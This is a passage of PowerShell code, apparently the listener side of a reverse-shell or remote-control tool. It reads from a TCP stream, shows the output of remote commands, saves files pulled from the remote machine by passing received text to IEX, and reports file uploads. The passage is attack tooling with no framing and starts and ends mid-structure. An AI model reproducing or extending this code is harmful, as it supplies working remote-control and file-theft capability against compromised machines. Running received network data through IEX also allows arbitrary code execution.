    While(!($Stream.DataAvailable))
    {
      Start-Sleep -Milliseconds 1;
    }

    If($Stream.DataAvailable)
    {
      While($Stream.DataAvailable -or $Read -eq $Bytes.count)
      {
        Try {

          If(!($Stream.DataAvailable))
          {
            $Temp = 0;

            While(!($Stream.DataAvailable) -and $Temp -lt 1000)
            {
              Start-Sleep -Milliseconds 1;
              $Temp++;
            }

            If(!($Stream.DataAvailable))
            {
              Write-Host "`n [*] Connection Lost ! [*]`n" -ForegroundColor red -BackgroundColor Black;
              $Socket.Stop();
              $Client.Close();
              $Stream.Dispose();
              Exit;
            }
          }

          $Read = $Stream.Read($Bytes,0,$Bytes.length);
          $OutPut += (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0,$Read);
        }

        Catch {

          Write-Host "`n [*] Connection Lost ! [*]`n" -ForegroundColor red -BackgroundColor Black;
          $Socket.Stop();
          $Client.Close();
          $Stream.Dispose();
          Exit;
        }
      }

      If(!($Info))
      {
        $Info = "$OutPut";
      }

      If($OutPut -ne " " -and !($Save) -and !($Upload))
      {
        Write-Host "`n$OutPut";
      }

      If($Save)
      {
        If($OutPut -ne " ")
        {
          If(!([System.IO.File]::Exists("$File")))
          {
            $FileBytes = IEX("($OutPut)");
            [System.IO.File]::WriteAllBytes("$File",$FileBytes);
            Write-Host " [*] Success ! [*]" -ForegroundColor green;
            Write-Host " [*] File Saved: $File [*]`n" -ForegroundColor Magenta;

          } Else {

            Write-Host " [*] Failed ! [*]" -ForegroundColor red -BackgroundColor Black;
            Write-Host " [*] File already Exists [*]`n" -ForegroundColor yellow -BackgroundColor Black;
          }
        }   Else {

            Write-Host " [*] Failed ! [*] " -ForegroundColor red -BackgroundColor Black;
            Write-Host " [*] File Missing [*]`n" -ForegroundColor red -BackgroundColor Black;
        }

        $File = $Null;
        $Save = $False;
      }

      If($Upload)
      {
        If($OutPut -ne " ")
        {
          $OutPut = $OutPut -replace "`n","";
          Write-Host " [*] Success..! [*]" -ForegroundColor green;
          Write-Host " [*] File Uploaded: $OutPut`n" -ForegroundColor Magenta;

        } Else {
          
          Write-Host " [*] Failed..! [*]" -ForegroundColor red -BackgroundColor Black;
          Write-Host " [*] File already Exists [*]`n" -ForegroundColor yellow -BackgroundColor Black;
        }

        $Upload = $False;
      }

    $WaitData = $False;
    $Read = $Null;
    $OutPut = $Null;
  }
 }
}
}